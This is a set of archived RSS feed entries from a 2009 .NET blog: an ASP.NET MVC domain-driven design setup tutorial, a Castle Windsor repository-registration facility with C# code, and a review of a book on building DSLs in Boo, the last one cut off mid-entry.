{"subscription":{"$wrap":"$oid","v":36},"link":"http://nathan.whiteboard-it.com/archive/2009/03/01/asp.net-mvc-domain-driven-design.aspx","title":"ASP.NET MVC Domain Driven Design","published":{"$wrap":"$date","v":1235934747000,"h":"2009-03-01T19:12:27.000Z"},"starred":false,"read":false,"content":"<h4>Series Navigation</h4><ol><li><a href=\"http://nathan.whiteboard-it.com/archive/2009/03/01/asp.net-mvc-domain-driven-design.aspx\">Setup</a></li><li><a href=\"http://nathan.whiteboard-it.com/archive/2009/03/06/asp.net-mvc-domain-driven-design-deux.aspx\">Mapping and Entity Equality</a></li></ol><h3>Introduction</h3><p>In this series of posts, I will detail how I setup projects using the principles of domain driven design in<a href=\"http://www.asp.net/mvc/\">ASP.NET MVC</a>.</p><p>The tools and libraries we will use are as follows:</p><ul><li><a href=\"http://www.nhforge.org/index.htm\">NHibernate</a></li><li><a href=\"http://fluentnhibernate.org/\">Fluent NHibernate</a></li><li><a href=\"http://nhcontrib.wiki.sourceforge.net/BurrowHome\">NHibernate.Burrow</a></li><li><a href=\"http://www.codeplex.com/MVCContrib\">MVCContrib</a></li><li><a href=\"http://code.google.com/p/moq/\">Moq</a></li><li><a href=\"http://www.nunit.org/index.php\">NUnit</a></li></ul><p>The sample app will be the canonical blog example. This series will be light on the discussion of the theory of DDD and heavy on the nuts and bolts of asp.net MVC implementation.</p><h3>Project Structure</h3><p>Create a new directory for the project.  I'm calling mine DDDSample.  Following subversion convention, create a trunk and branches folder inside of DDDSample.  Inside of trunk, create three directories: src, tools, and libraries.</p><p>The<em>'src'</em>directory is where our code will go.  The<em>'tools'</em>directory will have NUnit and in the future, NAnt.  The<em>'libraries'</em>directory will contain the third party binaries that the project references.</p><h3>Gathering the Libraries and Tools</h3><p>1) Download the latest binary of fluent nhibernate from<a href=\"http://fluentnhibernate.org/downloads\">http://fluentnhibernate.org/downloads</a>.  Put the fluent nhibernate binaries in<strong>trunk/libraries/fluent-nhibernate</strong>.</p><p>2) Download NHibernate.Burrow from<a href=\"http://sourceforge.net/project/showfiles.php?group_id=216446\">http://sourceforge.net/project/showfiles.php?group_id=216446</a>.  Put the burrow binaries in<strong>trunk/libraries/nhibernate.burrow</strong>.  Important Note: Sometimes the latest version of NHibernate.Burrow will not have been built against the same version of NHibernate as fluent nhibernate was.  Therefore, it is important that you be able to build NHibernate.Burrow, and the rest of the libraries that follow, from source.  NHibernate.Burrow is a part of<a href=\"http://nhcontrib.wiki.sourceforge.net/\">NHContrib</a>.  The NHContrib svn repository is located at<font face=\"Arial\"><a href=\"https://nhcontrib.svn.sourceforge.net/svnroot/nhcontrib/trunk\">https://nhcontrib.svn.sourceforge.net/svnroot/nhcontrib/trunk</a>.  There is a build script in the root directory of the NHibernate.Burrow subdirectory of the project.  To rebuild with a different version of NHibernate, just replace the NHibernate dll in<strong>NHibernate.Burrow/lib/NHibernate</strong>with the binary of NHibernate from the fluent nhibernate.</font></p><p>3) Download NUnit from<a href=\"http://www.nunit.org/index.php?p=download\">http://www.nunit.org/index.php?p=download</a>.  Get the zip distribution . Unzip the entire contents into<strong>trunk/tools/nunit</strong>.  It is important that you include the full NHibernate distribution with your project so when we add an automated build tool later it will be able to run the unit tests without assuming that every developer has installed the correct version of NUnit from msi.</p><p>4) Download Moq from<a href=\"http://code.google.com/p/moq/downloads/list\">http://code.google.com/p/moq/downloads/list</a>.  Put the binaries in<strong>trunk/libraries/moq</strong>.</p><p>5) Download MVCContrib from<a href=\"http://www.codeplex.com/MVCContrib\">http://www.codeplex.com/MVCContrib</a>.  Put the binaries in<strong>trunk/libraries/mvccontrib</strong>.</p><p>As an added measure of safety against change, I like to reference the MVC libraries themselves from binaries I store in my svn repository instead of from source.  You don't have to do this, but if you choose to, I put System.Web.Mvc, System.Web.Routing, and System.Web.Abstractions in<strong>trunk/libraries/mvc</strong>.</p><p>Your completed project structure should look like this:</p><p><img height=\"248\" alt=\"\" width=\"184\" src=\"/images/nathan_whiteboard-it_com/DDDSample/ProjectStructure.png\" /></p><h3>Creating the Projects</h3><p>Our mvc project and class libraries will go in trunk/src.</p><p>Create an asp.net MVC project.  For this sample, I'm calling mine Blog.Web.</p><p>Create two class libraries: Blog.Domain and Blog.Service.  Blog.Domain is where our POCO (Plain Old C# Objects) entities and our repository interfaces will reside.  Blog.Service is where the business logic that ties the application together will live.</p><p>Reference Blog.Domain and Blog.Service from Blog.Web.  Reference Blog.Domain from Blog.Service.</p><p>Create a new solution folder (right click on project, hover over add, choose new solution folder) called Test.  This is where our test projects will go.</p><p>Create three class libraries: Blog.Web.Test, Blog.Domain.Test, and Blog.Service.Test.  In each of these projects reference NUnit.Framework from /trunk/tools/nunit.</p><p>More test projects may be needed later for separating unit tests from integration tests, but this is how I like to start with one unit test project for each of my projects.</p><p>The solution should now look like this:</p><p><img height=\"146\" alt=\"\" width=\"202\" src=\"/images/nathan_whiteboard-it_com/DDDSample/SolutionStructure.png\" /></p><h3>Entity Base Class</h3><p>In the domain, create an object ot be the base class for entities.  An entity is an object that has an identity.</p><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier New\"><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">1</span><span style=\"COLOR: #cc7832\">namespace</span>Blog.Domain</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">2</span>{</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">3</span><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">abstract</span><span style=\"COLOR: #cc7832\">class</span><span style=\"COLOR: #ffc66d\">Entity</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">4</span>{</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">5</span><span style=\"COLOR: #cc7832\">private</span><span style=\"COLOR: #cc7832\">int</span>id;</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">6</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">7</span><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">virtual</span><span style=\"COLOR: #cc7832\">int</span>Id {<span style=\"COLOR: #cc7832\">get</span>{<span style=\"COLOR: #cc7832\">return</span>id; } }</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">8</span>}</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">9</span>}</p></div><p>There is no way to set the id property of the Entity base class.  This is by design.  Our persistence layer will use NHiberante generators to generate the identity values when we save new entities to the database.</p><h3>Repositories</h3><p>Just what are repositories?  Repositories are an abstraction of the way we manage<a href=\"http://domaindrivendesign.org/discussion/messageboardarchive/Aggregates.html\">aggregates</a>.  Repositories should correspond only to aggregate roots.   An aggregate is a cluster of objects that are treated as a unit.  The aggregate root is the root object of the unit.</p><p>In Domain Driven Design, the repository interfaces are a part of the domain, but the implementations are not.</p><h3>Generic Repository of Entities</h3><p>All entity repositories will need some base functionality, so we define IRepository&lt;T&gt; with some basic methods that we expect any repository to need.</p><div style=\"FONT-WEIGHT: bold; FONT-SIZE: 10pt; BACKGROUND: black; COLOR: white; FONT-FAMILY: Courier New\"><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">1</span><span style=\"COLOR: #cc7832\">using</span>System.Collections.Generic;</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">2</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">3</span><span style=\"COLOR: #cc7832\">namespace</span>Blog.Domain</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">4</span>{</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">5</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">6</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">Repository of entities.</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">7</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">8</span><span style=\"COLOR: #cc7832\">public</span><span style=\"COLOR: #cc7832\">interface</span><span style=\"COLOR: #6897bb\">IRepository</span><span style=\"FONT-WEIGHT: normal\">&lt;T&gt;</span><span style=\"COLOR: #cc7832\">where</span>T :<span style=\"COLOR: #ffc66d\">Entity</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">9</span>{</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">10</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">11</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">Find an entity by unique identifier.</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">12</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">13</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;param name=\"id\"&gt;</span><span style=\"COLOR: green\">Unique identifier of the entity.</span><span style=\"COLOR: gray\">&lt;/param&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">14</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;returns&gt;</span><span style=\"COLOR: green\">Entity if found,</span><span style=\"COLOR: gray\">&lt;c&gt;</span><span style=\"COLOR: green\">null</span><span style=\"COLOR: gray\">&lt;/c&gt;</span><span style=\"COLOR: green\">otherwise.</span><span style=\"COLOR: gray\">&lt;/returns&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">15</span>T Find(<span style=\"COLOR: #cc7832\">int</span>id);</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">16</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">17</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">18</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">Find all entities.</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">19</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">20</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;returns&gt;</span><span style=\"COLOR: green\">Sequence of entities found.</span><span style=\"COLOR: gray\">&lt;/returns&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">21</span><span style=\"COLOR: #6897bb\">IEnumerable</span><span style=\"FONT-WEIGHT: normal\">&lt;T&gt; FindAll();</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">22</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">23</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">24</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">Save (insert or update as appropriate)</span><span style=\"COLOR: gray\">&lt;paramref name=\"entity\"/&gt;</span><span style=\"COLOR: green\">on next commit of the unit of work.</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">25</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">26</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;param name=\"entity\"&gt;</span><span style=\"COLOR: green\">Entity to be saved.</span><span style=\"COLOR: gray\">&lt;/param&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">27</span><span style=\"COLOR: #cc7832\">void</span>Save(T entity);</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">28</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">29</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">30</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\">Delete</span><span style=\"COLOR: gray\">&lt;paramref name=\"entity\"/&gt;</span><span style=\"COLOR: green\">on next commit of the unit of work.</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">31</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;/summary&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">32</span><span style=\"COLOR: gray\">///</span><span style=\"COLOR: green\"></span><span style=\"COLOR: gray\">&lt;param name=\"entity\"&gt;</span><span style=\"COLOR: green\">Entity to be deleted.</span><span style=\"COLOR: gray\">&lt;/param&gt;</span></p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">33</span><span style=\"COLOR: #cc7832\">void</span>Delete(T entity);</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">34</span>}</p><p style=\"MARGIN: 0px\"><span style=\"FONT-WEIGHT: normal; COLOR: #2b91af\">35</span>}</p></div><h3>Conclusions</h3><p>In this post we have done a lot of nuts and bolts work.  The amount of setup required may seem daunting, but as stated earlier, the third party tools and libraries will pay dividends in the long-run.</p><p>In the<a href=\"http://nathan.whiteboard-it.com/archive/2009/03/06/asp.net-mvc-domain-driven-design-deux.aspx\">next post</a>, we will create a Post entity, create a concrete implementation of IRepository&lt;Post&gt; using NHibernate, map Post to a database using Fluent NHibernate, and test our persistence model.</p><p><!--EndFragment--><!--EndFragment--></p><br /><a href=\"http://www.dotnetkicks.com/kick/?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2009%2f03%2f01%2fasp.net-mvc-domain-driven-design.aspx\"><img alt=\"kick it on DotNetKicks.com\" border=\"0\" src=\"http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2009%2f03%2f01%2fasp.net-mvc-domain-driven-design.aspx\" /></a><img src=\"http://nathan.whiteboard-it.com/aggbug/16.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=5qzXvCIXLRU:9j0PRoqwcQU:tcjm6QUOmhc\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=tcjm6QUOmhc\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=5qzXvCIXLRU:9j0PRoqwcQU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=5qzXvCIXLRU:9j0PRoqwcQU:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=7Q72WNTAKBA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/5qzXvCIXLRU\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1043}}
{"k":"0000000084","o":"0000007376","v":"001"}
{"_id":1044,"_uid":1044,"_dt":1373742602034,"_s":"52329a9f62db1d5a879c9ae97207a547"}
{"subscription":{"$wrap":"$oid","v":36},"link":"http://nathan.whiteboard-it.com/archive/2009/02/26/register-repository-implementations-automatically-with-a-castle-facility.aspx","title":"Register Repository Implementations Automatically with a Castle Facility","published":{"$wrap":"$date","v":1235670754000,"h":"2009-02-26T17:52:34.000Z"},"starred":false,"read":false,"content":"<p>Isn't it annoying to have to register all your repository implementations by hand?  When you get to a certain number of them, it becomes quite a task.  If you want to register them for multiple interfaces, it gets even worse.</p><p>When using<a href=\"http://www.castleproject.org/container/index.html\">Windsor</a>as your inversion of control container, separating your repository registrations into a<a href=\"http://www.castleproject.org/container/documentation/trunk/concepts/facility.html\">facility</a>is a good start.  In general though, all our repositories follow a simple pattern and should be easily registerable automatically following an algorithm.</p><p><a href=\"http://domaindrivendesign.org/\">Domain driven design</a>tells us that the<a href=\"http://blogs.hibernatingrhinos.com/nhibernate/archive/2008/10/08/the-repository-pattern.aspx\">repository</a>interfaces are a part of the domain but the implementations are not.  Therefore, we usually have two assemblies that are important.</p><p>This is a typical project layout:</p><p><img height=\"185\" alt=\"\" width=\"616\" src=\"/images/nathan_whiteboard-it_com/Automatic Repository Registration/assemblies.png\" /></p><p>Our facility needs to allow us to configure what assemblies it searches for types and the base type of the repository.</p><h2>Specification</h2><p>Here is a simple test describing the desired behavior:</p><!-- code formatted by http://manoli.net/csharpformat/ --><pre class=\"csharpcode\">[TestFixture]<span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>RepositoryRegistrationFacilityTestFixture{[Test]<span class=\"kwrd\">public</span><span class=\"kwrd\">void</span>ShouldRegisterCustomerRepository(){var kernel =<span class=\"kwrd\">new</span>Castle.MicroKernel.DefaultKernel();<br /><br /><br /><br />var facility =<span class=\"kwrd\">new</span>RepositoryRegistrationFacility(<span class=\"kwrd\">typeof</span>(IRepository&lt;&gt;),<span class=\"kwrd\">typeof</span>(Customer).Assembly);<br /><br />facility.Init(kernel,<br /><span class=\"kwrd\">new</span>Castle.Core.Configuration.MutableConfiguration(<span class=\"str\">\"facility-config\"</span>));<br /><br /><br /><br />kernel.Resolve&lt;ICustomerRepository&gt;().ShouldBeInstanceOfType(<span class=\"kwrd\">typeof</span>(CustomerRepository));kernel.Resolve&lt;IRepository&lt;Customer&gt;&gt;().ShouldBeInstanceOfType(<span class=\"kwrd\">typeof</span>(CustomerRepository));<br />}<br /><br /><br /><br /><span class=\"kwrd\">protected</span><span class=\"kwrd\">interface</span>IRepository&lt;T&gt;{}<span class=\"kwrd\">protected</span><span class=\"kwrd\">interface</span>ICustomerRepository : IRepository&lt;Customer&gt;{}<span class=\"kwrd\">protected</span><span class=\"kwrd\">class</span>CustomerRepository : ICustomerRepository{}<span class=\"kwrd\">protected</span><span class=\"kwrd\">class</span>Customer{}}</pre><h2>Implementation</h2><!-- code formatted by http://manoli.net/csharpformat/ --><pre class=\"csharpcode\"><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>RepositoryRegistrationFacility : AbstractFacility{<span class=\"kwrd\">private</span><span class=\"kwrd\">readonly</span>Assembly[] assemblies;<span class=\"kwrd\">private</span><span class=\"kwrd\">readonly</span>Type genericRepositoryType;<span class=\"kwrd\">public</span>RepositoryRegistrationFacility(Type genericRepositoryType,<span class=\"kwrd\">params</span>Assembly[] assemblies){<span class=\"kwrd\">this</span>.assemblies = assemblies;<span class=\"kwrd\">this</span>.genericRepositoryType = genericRepositoryType;}<span class=\"kwrd\">protected</span><span class=\"kwrd\">override</span><span class=\"kwrd\">void</span>Init(){Predicate&lt;Type&gt; isGenericRepositoryInterface =type =&gt;type.GetInterfaces().Contains(x =&gt; x.IsGenericType&& x.GetGenericTypeDefinition().IsAssignableFrom(genericRepositoryType));IEnumerable&lt;Type&gt; types =assemblies.Aggregate(Enumerable.Empty&lt;Type&gt;(), (accumulator, assembly) =&gt; accumulator.Concat(assembly.GetTypes()));IEnumerable&lt;Type&gt; repositoryInterfaces = types.Where(type =&gt; type.IsInterface&& !type.IsGenericTypeDefinition&& isGenericRepositoryInterface(type));repositoryInterfaces.ForEach(interfaceType =&gt;{Type implementor =types.FirstOrDefault(type =&gt; interfaceType.IsAssignableFrom(type)&& !type.IsAbstract);<span class=\"kwrd\">if</span>(implementor ==<span class=\"kwrd\">null</span>)<span class=\"kwrd\">return</span>;IEnumerable&lt;Type&gt; genericRepositoryInterfaceTypes = implementor.GetInterfaces().Where(x =&gt;x.IsGenericType&&x.GetGenericTypeDefinition().IsAssignableFrom(genericRepositoryType));Kernel.Register(Component.For(interfaceType).ImplementedBy(implementor).Forward(genericRepositoryInterfaceTypes));});}}</pre><p>Now in fluent configuration you can just do this:<!-- code formatted by http://manoli.net/csharpformat/ --></p><pre class=\"csharpcode\">container.AddFacility(<span class=\"str\">\"persistent-repository-facility\"</span>,<span class=\"kwrd\">new</span>RepositoryRegistrationFacility(<span class=\"kwrd\">typeof</span>(IRepository&lt;&gt;),<span class=\"kwrd\">typeof</span>(IRepository&lt;&gt;).Assembly,<span class=\"kwrd\">typeof</span>(SomethingRepository).Assembly));</pre><br /><p>I have not tested the binsor registration, but you should be able to do something like this to register it using binsor:</p><pre class=\"csharpcode\">facility RepositoryRegistrationFacility:genericRepositoryType: IRepositoryassemblies: array(System.Reflection.Assembly, IRepository.Assembly, SomethingRepository.Assembly)</pre><br /><p>I hope this is useful.</p><a href=\"http://www.dotnetkicks.com/kick/?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2009%2f02%2f26%2fregister-repository-implementations-automatically-with-a-castle-facility.aspx\"><img alt=\"kick it on DotNetKicks.com\" border=\"0\" src=\"http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2009%2f02%2f26%2fregister-repository-implementations-automatically-with-a-castle-facility.aspx\" /></a><img src=\"http://nathan.whiteboard-it.com/aggbug/15.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=Bhz_I37YCsg:86O-yFkm4A4:tcjm6QUOmhc\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=tcjm6QUOmhc\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=Bhz_I37YCsg:86O-yFkm4A4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/PublicClassWheel?a=Bhz_I37YCsg:86O-yFkm4A4:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/PublicClassWheel?d=7Q72WNTAKBA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/Bhz_I37YCsg\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1044}}
{"k":"0000000084","o":"0000007863","v":"001"}
{"_id":1045,"_uid":1045,"_dt":1373742602035,"_s":"468c4d0c960e99e53634c545cb6e23f3"}
{"subscription":{"$wrap":"$oid","v":36},"link":"http://nathan.whiteboard-it.com/archive/2009/01/31/building-domain-specific-languages-in-boo-by-oren-eini.aspx","title":"Building Domain Specific Languages in Boo by Oren Eini","published":{"$wrap":"$date","v":1233430740000,"h":"2009-01-31T19:39:00.000Z"},"starred":false,"read":false,"content":"<div style=\"MARGIN: 0in 0in 10pt\">Building Domain Specific Languages (<a href=\"http://en.wikipedia.org/wiki/Domain-specific_programming_language\">DSL</a>) in<a href=\"http://boo.codehaus.org/\">Boo</a>by<a href=\"http://ayende.com/about-me.aspx\">Oren Eini</a>leads the intermediate to advanced programmer through the process of building several DSLs in the Boo programming language. It is not an introduction to Boo, but rather it is assumed that the user is advanced enough so that picking up a new language is not an insurmountable prerequisite. A Boo tutorial and reference is provided in the appendix.</div><div style=\"MARGIN: 0in 0in 10pt\">The writing style is inviting an informal. The first two paragraphs will immediately endear programmers to Oren Eini:</div><div style=\"BORDER-RIGHT: medium none; PADDING-RIGHT: 0in; BORDER-TOP: medium none; PADDING-LEFT: 0in; PADDING-BOTTOM: 4pt; MARGIN-LEFT: 0.65in; BORDER-LEFT: medium none; MARGIN-RIGHT: 0.65in; PADDING-TOP: 0in\"><div style=\"MARGIN: 10pt 0in 14pt\"><strong><em>At first, there was the bit. And the bit shifted left, and the bit shifted right, and there was the byte. The byte grew into a word, and then into double word. And the developer saw the work and it was good. And the evening and the morning were the first day.</em></strong></div><div styl2e=\"MARGIN: 10pt 0in 14pt\"><strong><em>And on the next day, the developer came back to the work and couldn’t figure out what he was thinking last night, and spent the whole day figuring that out.</em></strong></div></div><div style=\"MARGIN: 0in 0in 10pt\"></div><div style=\"MARGIN: 0in 0in 10pt\">Oren chose to write about building DSLs in Boo specifically because of the excellent<a href=\"http://en.wikipedia.org/wiki/Language-oriented_programming\">language-oriented programming</a>features available in the Boo programming language. This is not a book about the nuts and bolts of building a language from scratch. That would not truly be a treatise on DSLs as the purpose of DSLs is increased abstraction. That increased abstraction drives Oren’s craft. He makes no reservations about the fact that code maintainability and not performance is his primary concern.</div><div style=\"MARGIN: 0in 0in 10pt\">This is a book about getting your feet wet and jumping right into building usable real-world DSLs.   This book is immediately applicable to the work performed by hundreds of thousands of programmers every day.  The DSLs presented in the book are pertinent to the work of enterprise developers. Thorough code samples of the fully functional DSLs are provided.</div><div style=\"MARGIN: 0in 0in 10pt\"><a href=\"https://rhino-tools.svn.sourceforge.net/svnroot/rhino-tools/trunk/rhino-dsl/\">Rhino DSL</a>is Oren’s low-level implementation of a language factory. It is leveraged throughout the book. Sufficient detail into the design goals and implementation of the library are given so that it could be easily reproduced even if it were not freely available as open source. Rhino DSL is licensed under the BSD license. I have used it. It is wonderful and I see no reason to reinvent the wheel.</div><div style=\"MARGIN: 0in 0in 10pt\">Testing, versioning, and creating IDEs to polish your DSLs are topics treated thoroughly. Oren teaches you how and when to version your DSL. He presents several strategies for versioning. He drives home the points that automated testing is not an option, it’s a requirement.</div><div style=\"MARGIN: 0in 0in 10pt\">I found the chapter on creating an IDE invaluable. Oren recommends using Sharp Develop. It is freely distributable and allows you to build a stand-alone DSL editor to distribute as a part of your package. The chapter begins by demonstrating how to provide a good text editing experience with syntax highlighting and code completion and then moves on to advanced topics such as how to create visualizations to round out the editing experience. This task is made easier thanks to the ability to use the abstract syntax tree (AST) provided by the Boo Parser. Score another one for Boo!</div><div style=\"MARGIN: 0in 0in 10pt\">Not all of Oren’s advice is about programming itself. He provides insights into the business-aspect of creating DSLs as well. The first emphasis box in the documentation chapter is titled “Ensure an initial positive impression.”   The common-sense statements in this box provide polish to the book, much as he is trying to teach the reader how to provide polish to a DSL.</div><div style=\"MARGIN: 0in 0in 10pt\">These sentences captured my interest intently:</div><div style=\"BORDER-RIGHT: medium none; PADDING-RIGHT: 0in; BORDER-TOP: medium none; PADDING-LEFT: 0in; PADDING-BOTTOM: 4pt; MARGIN-LEFT: 0.65in; BORDER-LEFT: medium none; MARGIN-RIGHT: 0.65in; PADDING-TOP: 0in\"><div style=\"MARGIN: 10pt 0in 14pt\"><strong><em>A project that looks good is pleasant to use, easier to demo and in general easier to get funding for.</em></strong></div><div style=\"MARGIN: 10pt 0in 14pt\"><strong><em>The first stage should be a very easy one, even if you have to design to enable that specifically.</em></strong></div></div><div style=\"MARGIN: 0in 0in 10pt\">How often as programmers do we neglect to create a good first-impression of our amazing products? The code is well-tested and flawless, but it takes another computer scientist of equal skill an hour to get anything working.</div><div style=\"MARGIN: 0in 0in 10pt\">Oren’s blend of humor and common-sense advice makes the book a joy to read. His example code and discussion of abstract concepts will challenge you to become a better programmer. Oren brings you into his world, one where everything is done correctly. All code is maintainable, self-documenting, and easy-to-read.</div><div style=\"MARGIN: 0in 0in 10pt\"><div style=\"MARGIN: 0in 0in 10pt\">If you are a .NET developer, I cannot encourage you enough to pick up this book. Oren’s thoughts are valuable even if you never write a DSL. The concepts of language-oriented programming are<a href=\"http://www.infoq.com/news/2007/09/Language-oriented-programming\">becoming more main-stream</a>, and this book is an excellent introduction that will open your eyes to the practical implications of language-oriented design.</div></div><a href=\"http://www.dotnetkicks.com/kick/?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2009%2f01%2f31%2fbuilding-domain-specific-languages-in-boo-by-oren-eini.aspx\"><img alt=\"kick it on 